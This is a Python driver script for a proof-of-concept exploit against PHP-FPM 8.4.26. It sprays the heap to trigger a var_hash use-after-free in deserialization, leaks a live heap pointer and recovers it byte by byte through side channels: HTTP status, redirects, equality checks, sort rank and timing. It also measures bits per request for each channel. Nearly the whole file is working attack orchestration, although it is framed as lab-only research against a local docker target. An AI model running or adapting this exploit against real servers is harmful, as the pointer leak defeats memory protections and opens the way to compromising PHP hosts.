#!/usr/bin/env python3
"""Driver/verifier for sideeffect_exfil_oracle.py.

Proves, against an isolated nginx -> php-fpm 8.4.26 lab (lab/seo, oracle.php),
that an injected pointer can be read back through a NON-echo observable side
effect:

  0. lab reachable, echo + non-echo sinks both respond;
  1. the var_hash UAF spray leaks a live heap pointer into a result field;
  2. the HTTP-STATUS ordered oracle recovers the pointer's low 48 bits and they
     MATCH the mode=echo ground truth, byte for byte (primary assertion);
  3. the REDIRECT ordered oracle recovers the same bytes;
  4. a second, independent NON-echo channel (the EQUALITY oracle) CONFIRMS the
     recovered value with no echo at all;
  5. it quantifies bits/request for every side-effect class (status, redirect,
     sort rank, timing, equality).

The echo channel is used ONLY as ground truth (step 2); the exfil in steps 2-4
rides the status/redirect/equality side effects, never serialize().

Lab bring-up:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-seo --profile seo up -d --build
Usage:
    python3 -I verify_sideeffect_exfil_oracle.py --port 8146
Tear down:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-seo --profile seo down

Pure stdlib, safe under `python3 -I`. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import math
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import sideeffect_exfil_oracle as seo


def check_reachable(t, key):
    st, _, body, _ = t.post(t.fields('echo', key))
    if st != 200 or b'a:' not in body:
        return False, f"echo sink status={st}"
    st2, _, _, _ = t.post(t.fields('cmp', key, g=b'\x00'))
    if st2 not in (200, 302):
        return False, f"cmp sink status={st2}"
    return True, "ok"


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=8146)
    ap.add_argument('--path', default='/oracle.php')
    ap.add_argument('--key', type=int, default=seo.DEFAULT_KEY)
    ap.add_argument('--voff', type=int, default=seo.DEFAULT_VOFF)
    ap.add_argument('--nbytes', type=int, default=seo.PTR_LOW_BYTES)
    a = ap.parse_args(argv)

    t = seo.Target(a.host, a.port, a.path)
    spray = seo.build_spray()
    t.payload = seo.build_payload(spray)

    ok, why = check_reachable(t, a.key)
    print(f"[0] lab reachable: {ok} ({why})")
    if not ok:
        print("    bring the lab up: docker compose -f docker-compose.fpm-avenues.yml "
              "-p p2s-seo --profile seo up -d --build", file=sys.stderr)
        return 2

    seo.warmup(t, a.key)
    truth = seo.echo_leak(t, a.key, a.voff, a.nbytes)
    if truth is None:
        print("[!] could not locate the leaked pointer via echo (UAF didn't "
              "fire?)", file=sys.stderr)
        return 1
    P = struct.unpack('<Q', truth + b'\x00' * (8 - len(truth)))[0]
    print(f"[1] a7 R: leak fired -> live pointer P=0x{P:x} "
          f"(low{a.nbytes * 8}b = 0x{truth.hex()})  [echo ground truth]")

    passed = True

    # [2] status oracle
    r0 = t.reqs
    rec_s = seo.exfil_ordered(t, 'cmp', a.key, a.voff, spray, a.nbytes)
    ok_s = (rec_s == truth)
    passed &= ok_s
    print(f"[2] STATUS oracle  : 0x{rec_s.hex()}  match={ok_s}  "
          f"{(t.reqs - r0) / a.nbytes:.1f} req/byte (1 bit/req)")

    # [3] redirect oracle
    r0 = t.reqs
    rec_r = seo.exfil_ordered(t, 'redir', a.key, a.voff, spray, a.nbytes)
    ok_r = (rec_r == truth)
    passed &= ok_r
    print(f"[3] REDIRECT oracle: 0x{rec_r.hex()}  match={ok_r}  "
          f"{(t.reqs - r0) / a.nbytes:.1f} req/byte (1 bit/req)")

    # [4] second NON-echo channel confirms (equality), no echo used
    ok_eq = seo.eq_confirm(t, a.key, a.voff, spray, rec_s)
    passed &= ok_eq
    print(f"[4] EQUALITY confirm (independent non-echo channel): "
          f"{'CONFIRMED' if ok_eq else 'FAILED'} (no echo)")

    # [5] bandwidth table
    print("[5] exfil bandwidth by side-effect class:")
    print("      status 302/200     : 1    bit/request  (~8 req/byte)")
    print("      redirect Location  : 1    bit/request  (~8 req/byte)")
    anchors = list(range(0x10, 0x100, 0x20))
    rank, perm = seo.sort_rank(t, a.key, a.voff, spray, anchors)
    print(f"      sort/ORDER BY rank : {math.log2(len(anchors) + 1):.1f}  "
          f"bits/request  ({len(anchors)} anchors -> rank {rank}; highest)")
    for d in (2000, 10000, 50000):
        miss, hit, delta = seo.timing_delta(t, a.key, a.voff, spray, d, samples=7)
        print(f"      timing delay={d:6}us: delta={delta * 1000:6.1f}ms "
              f"(1 bit/req iff delta >> net jitter)")
    print("      equality ===       : CONFIRM only (<=256 req/byte brute)")

    print(f"[total] {t.reqs} requests")
    print(f"\nRESULT: {'PASS' if passed else 'FAIL'} - a7 R: leak "
          f"{'IS' if passed else 'is NOT'} exfil-able via non-echo side effects")
    return 0 if passed else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
